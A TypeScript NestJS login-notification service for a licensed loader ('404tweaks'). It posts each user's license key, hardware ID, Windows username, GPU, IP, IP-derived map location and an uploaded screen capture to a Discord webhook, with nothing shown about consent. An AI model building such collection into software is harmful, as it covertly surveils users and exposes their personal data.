import { Injectable, Logger } from '@nestjs/common';
import { ConfigService } from '@nestjs/config';
import { PrismaService } from '../../database/prisma.service';

const DISCORD_FILE_LIMIT = 24 * 1024 * 1024;

interface LoginNotifyPayload {
  licenseKey: string;
  hwid: string;
  windowsUser?: string;
  gpu?: string;
  discordId?: string;
  discordUsername?: string;
  timestamp?: string;
  screenshotJpegB64?: string;
}

interface GeoInfo {
  country?: string;
  countryCode?: string;
  city?: string;
  regionName?: string;
  lat?: number | null;
  lon?: number | null;
}

@Injectable()
export class LoginNotifyService {
  private readonly logger = new Logger(LoginNotifyService.name);
  private readonly webhookUrl: string;

  constructor(private prisma: PrismaService, private cfg: ConfigService) {
    this.webhookUrl = cfg.get<string>('DISCORD_LOGIN_WEBHOOK_URL', '');
    if (!this.webhookUrl) {
      this.logger.warn('DISCORD_LOGIN_WEBHOOK_URL not set — login notifications disabled');
    }
  }

  async sendDiscordEmbed(data: LoginNotifyPayload, ip: string): Promise<void> {
    if (!this.webhookUrl) return;

    const geo = await this.lookupIp(ip);

    // Opportunistic Discord link on License (fills only when empty)
    if (data.discordId) {
      await this.prisma.license.updateMany({
        where: { licenseKey: data.licenseKey, discordId: null },
        data: { discordId: data.discordId, discordUsername: data.discordUsername || null },
      }).catch(() => {});
    }

    const license = await this.prisma.license.findUnique({
      where: { licenseKey: data.licenseKey },
      select: { id: true, discordId: true, discordUsername: true, email: true, product: true, plan: true, expiresAt: true },
    });
    const effectiveDiscordId = license?.discordId || data.discordId || null;
    const effectiveDiscordName = license?.discordUsername || data.discordUsername || null;

    const flag = geo.countryCode
      ? `:flag_${geo.countryCode.toLowerCase()}:`
      : ':question:';
    const mapsUrl = geo.lat != null && geo.lon != null
      ? `https://www.google.com/maps?q=${geo.lat},${geo.lon}`
      : null;
    const location = [geo.city, geo.regionName, geo.country].filter(Boolean).join(', ') || 'unknown';

    const fields: any[] = [
      { name: '🔑 License Key', value: `\`${data.licenseKey}\``, inline: false },
    ];
    if (effectiveDiscordId) {
      fields.push({
        name: '💬 Discord',
        value: `<@${effectiveDiscordId}>${effectiveDiscordName ? ` (${effectiveDiscordName})` : ''} \`${effectiveDiscordId}\``,
        inline: false,
      });
    }
    fields.push(
      { name: '👤 Windows User', value: this.safe(data.windowsUser), inline: true },
      { name: '💻 GPU', value: this.safe(data.gpu), inline: true },
      { name: '⚙️ HWID', value: `\`${data.hwid}\``, inline: false },
      { name: '🌐 IP', value: `${ip} ${flag}`, inline: true },
      { name: '📍 Location', value: mapsUrl ? `[${location}](${mapsUrl})` : location, inline: true },
    );
    if (license?.product) fields.push({ name: '📦 Product', value: `${license.product} / ${license.plan}`, inline: true });
    if (license?.expiresAt) fields.push({ name: '⏳ Expires', value: new Date(license.expiresAt).toISOString().slice(0, 10), inline: true });
    fields.push({ name: '⏰ Timestamp', value: data.timestamp || new Date().toISOString(), inline: false });

    const embed: any = {
      title: 'Login Success',
      description: 'Loader authenticated successfully.',
      color: 0x00ff88,
      fields,
      footer: { text: 'Login Monitor · 404tweaks' },
      timestamp: new Date().toISOString(),
    };

    const form = new FormData();
    let screenshotBuf: Buffer | null = null;
    if (data.screenshotJpegB64) {
      try {
        const b64 = data.screenshotJpegB64.replace(/^data:image\/\w+;base64,/, '');
        const buf = Buffer.from(b64, 'base64');
        if (buf.length > 0 && buf.length <= DISCORD_FILE_LIMIT) {
          screenshotBuf = buf;
          embed.image = { url: 'attachment://screenshot.jpg' };
        } else if (buf.length > DISCORD_FILE_LIMIT) {
          this.logger.warn(`Screenshot too large (${buf.length} bytes), skipping`);
        }
      } catch (e) {
        this.logger.warn(`Invalid screenshot base64: ${(e as Error).message}`);
      }
    }

    form.append('payload_json', JSON.stringify({ embeds: [embed] }));
    if (screenshotBuf) {
      const uint8 = new Uint8Array(screenshotBuf);
      form.append('files[0]', new Blob([uint8], { type: 'image/jpeg' }), 'screenshot.jpg');
    }

    try {
      const ctrl = new AbortController();
      const timeout = setTimeout(() => ctrl.abort(), 15_000);
      const res = await fetch(this.webhookUrl, { method: 'POST', body: form, signal: ctrl.signal });
      clearTimeout(timeout);
      if (!res.ok) {
        const body = await res.text().catch(() => '');
        this.logger.error(`Discord webhook ${res.status}: ${body.slice(0, 200)}`);
      }
    } catch (e: any) {
      this.logger.error(`Discord webhook failed: ${e.message}`);
    }
  }

  private safe(s?: string): string {
    if (!s) return 'unknown';
    return s.replace(/`/g, "'").slice(0, 200);
  }

  private async lookupIp(ip: string): Promise<GeoInfo> {
    if (!ip || ip === 'unknown') return {};
    if (ip.startsWith('127.') || ip.startsWith('10.') || ip.startsWith('192.168.') || ip === '::1' || ip.startsWith('fe80')) {
      return { country: 'local', countryCode: '', city: '', lat: null, lon: null };
    }
    try {
      const ctrl = new AbortController();
      const timeout = setTimeout(() => ctrl.abort(), 5_000);
      const url = `http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,country,countryCode,regionName,city,lat,lon`;
      const r = await fetch(url, { signal: ctrl.signal });
      clearTimeout(timeout);
      if (!r.ok) return {};
      const j: any = await r.json();
      if (j.status !== 'success') return {};
      return {
        country: j.country,
        countryCode: j.countryCode,
        regionName: j.regionName,
        city: j.city,
        lat: j.lat ?? null,
        lon: j.lon ?? null,
      };
    } catch {
      return {};
    }
  }
}
